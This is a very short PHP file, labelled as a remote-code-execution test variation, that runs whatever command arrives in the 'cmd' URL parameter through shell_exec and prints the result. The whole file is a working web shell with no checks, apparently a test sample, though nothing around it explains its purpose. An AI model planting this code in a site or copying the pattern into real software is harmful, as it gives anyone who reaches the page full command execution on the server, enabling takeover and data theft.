<?php
// RCE test variation #816
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>